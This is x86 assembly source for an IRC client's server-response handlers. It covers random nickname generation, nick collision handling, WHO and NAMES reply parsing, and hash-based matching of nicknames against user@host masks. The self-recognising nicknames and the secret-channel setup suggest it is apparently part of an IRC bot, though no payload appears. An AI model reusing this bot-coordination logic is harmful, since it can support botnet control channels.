; 컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴
;               Server response functions

srv_welcome:	or	dword [flags], flag_registered
		lea	edi, dword [writebuffer]
		mov	dword [edi], "PRIV"
		mov	dword [edi+4], "MSG "
		add	edi, 8
		lea	eax, [nickname]
		stdcall	copystring, edi,eax
		add	edi, eax
		mov	dword [edi], " :."
		mov	dword [edi+3], 10
		lea	eax, dword [writebuffer]
		stdcall	sendstring, eax
		ret

srv_nickinuse:	lea	edi, dword [writebuffer]
		mov	dword [edi], "NICK"
		mov	byte [edi+4], " "
		add	edi, 5
		test	dword [flags], flag_registered
		jnz	.nickvariation
		lea	esi, dword [nickname]
		stdcall	brandrange,6,9
		stdcall	makeword,esi,eax
		mov	byte [esi+eax], 0
		stdcall	copystring,edi,esi
		add	edi, eax
		mov	dword [edi], 10
		lea	eax, dword [writebuffer]
		stdcall	sendstring, eax
		ret
.nickvariation:	lea	esi, dword [nickname]
.endnick:	inc	esi
		cmp	byte [esi], "0"
		jb	.endfound
		cmp	byte [esi], "9"
		ja	.endnick
.endfound:	stdcall	brandrange,"0","9"
		mov	byte [esi], al
		stdcall	brandrange,"0","9"
		mov	byte [esi+1], al
		mov	byte [esi+2], 0
		lea	eax, dword [nickname]
		stdcall	copystring,edi,eax
		add	edi, eax
		mov	dword [edi], 10
		lea	eax, [writebuffer]
		stdcall	sendstring, eax
		ret

srv_whoreply:	lea	esi, dword [readline]
.channel:	inc	esi
		cmp	byte [esi], "#"
		jnz	.channel
		mov	ebx, esi
.user:		inc	esi
		cmp	byte [esi], " "
		jnz	.user
		mov	byte [esi], 0
		inc	esi
		lea	edi, [writebuffer]
.usercopy:	mov	al, [esi]
		cmp	al, " "
		jz	.usercopydone
		mov	[edi], al
		inc	esi
		inc	edi
		jmp	.usercopy
.usercopydone:	mov	byte [edi], "@"
		inc	edi
		inc	esi
.addresscopy:	mov	al, [esi]
		cmp	al, " "
		jz	.addresscopydone
		mov	[edi], al
		inc	esi
		inc	edi
		jmp	.addresscopy
.addresscopydone:
		mov	byte [edi], 0
		lea	eax, [writebuffer]
		stdcall	checksum,eax,0
.findnick:	inc	esi
		cmp	byte [esi], " "		; skip over server
		jnz	.findnick
.findendnick:	inc	esi
		cmp	byte [esi], " "
		jnz	.findendnick
		mov	al, "!"
		push	esi
.addnick:	lea	edi, [writebuffer]
		dec	edi
.addnickloop:	inc	edi
		xchg	al, [edi]
		or	al, al
		jnz	.addnickloop
		inc	edi
		xchg	al, [edi]
		dec	esi
		mov	al, [esi]
		cmp	al, " "
		jnz	.addnick
		pop	esi
		lea	edi, [writebuffer]
		xor	eax, eax
.settozero:	inc	eax
		cmp	byte [edi+eax], "!"
		jnz	.settozero
		mov	byte [edi+eax], 0
		stdcall	add_chan_nick,ebx,edi
		mov	ecx, eax
		mov	byte [ecx], "@"
		cmp	byte [esi+3], "@"
		jz	.moded
		mov	byte [ecx], "+"
		cmp	byte [esi+3], "+"
		jz	.moded
		mov	byte [ecx], " "
.moded:		lea	edi, [writebuffer]
		stdcall	makehashword,edi,edx
		lea	esi, [ecx+2]
.compare:	mov	al, [esi]
		or	al, al
		jz	.nicksmatch
		cmp	al, [edi]
		jnz	.nicksdontmatch
		inc	esi
		inc	edi
		jmp	.compare
.nicksmatch:	mov	byte [ecx+1], "+"
		lea	esi, [writebuffer]
		mov	ecx, esi
.nickzero:	inc	esi
		cmp	byte [esi], 0
		jnz	.nickzero
		mov	byte [esi], "!"
		stdcall	add_mask,ecx
		ret
.nicksdontmatch:mov	byte [ecx+1], " "
		ret

srv_namereply:	inc	esi
		cmp	byte [esi+1], ":"
		jnz	srv_namereply
		mov	ebx, esi
.startchan:	dec	ebx
		cmp	byte [ebx-1], " "
		jnz	.startchan
		mov	byte [esi], 0
		cmp	byte [esi+2], "@"
		jz	.emptychannel
		mov	dword [writebuffer], "WHO "
		lea	edi, [writebuffer+4]
		stdcall	copystring,edi,ebx
		mov	dword [edi+eax], 10
		lea	eax, [writebuffer]
		stdcall	sendstring,eax
		ret
.emptychannel:	mov	dword [writebuffer], "MODE"
		mov	byte [writebuffer+4], " "
		lea	edi, [writebuffer+5]
		stdcall	copystring,edi,ebx
		mov	dword [edi+eax], " +st"
		mov	dword [edi+eax+4], 10
		lea	eax, [writebuffer]
		stdcall	sendstring,eax
		lea	eax, [nickname]
		stdcall	add_chan_nick,ebx,eax
		mov	byte [eax], "@"
		mov	byte [eax+1], "+"
		ret
